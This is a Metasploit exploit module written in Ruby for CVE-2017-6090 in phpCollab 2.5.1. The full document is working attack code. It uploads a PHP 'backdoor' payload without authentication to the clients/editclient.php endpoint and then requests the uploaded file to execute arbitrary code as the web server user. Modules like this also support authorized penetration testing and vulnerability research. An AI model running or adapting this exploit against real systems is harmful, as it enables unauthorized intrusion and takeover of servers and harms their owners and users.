# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;phpCollab 2.5.1 Unauthenticated File Upload&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a file upload vulnerability in phpCollab 2.5.1
        which could be abused to allow unauthenticated users to execute arbitrary code
        under the context of the web server user.
 
        The exploit has been tested on Ubuntu 16.04.3 64-bit
      },
      &#039;Author&#039;         =>
        [
          &#039;Nicolas SERRA <n.serra[at]sysdream.com>&#039;, # Vulnerability discovery
          &#039;Nick Marcoccio "1oopho1e" <iremembermodems[at]gmail.com>&#039;, # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-6090&#039; ],
          [ &#039;EDB&#039;, &#039;42934&#039; ],
          [ &#039;URL&#039;, &#039;http://www.phpcollab.com/&#039; ],
          [ &#039;URL&#039;, &#039;https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 29 2017&#039;
      ))
 
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "Installed path of phpCollab ", "/phpcollab/"])
        ])
  end
 
  def check
    url = normalize_uri(target_uri.path, "general/login.php?msg=logout")
    res = send_request_cgi(
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     =>  url
    )
 
    version = res.body.scan(/PhpCollab v([\d\.]+)/).flatten.first
    vprint_status("Found version: #{version}")
 
    unless version
      vprint_status(&#039;Unable to get the PhpCollab version.&#039;)
      return CheckCode::Unknown
    end
 
    if Gem::Version.new(version) >= Gem::Version.new(&#039;0&#039;)
      return CheckCode::Appears
    end
 
    CheckCode::Safe
  end
 
  def exploit
    filename = &#039;1.&#039; + rand_text_alpha(8 + rand(4)) + &#039;.php&#039;
    id = File.basename(filename,File.extname(filename))
    register_file_for_cleanup(filename)
 
    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"upload\"; filename=\"#{filename}\"")
 
    print_status("Uploading backdoor file: #{filename}")
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;clients/editclient.php&#039;),
      &#039;vars_get&#039; => {
        &#039;id&#039;     => id,
        &#039;action&#039; => &#039;update&#039;
      },
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => data.to_s
     })
 
    if res && res.code == 302
      print_good("Backdoor successfully created.")
    else
      fail_with(Failure::Unknown, "#{peer} - Error on uploading file")
    end
 
    print_status("Triggering the exploit...")
    send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, "logos_clients/" + filename)
     }, 5)
  end
end

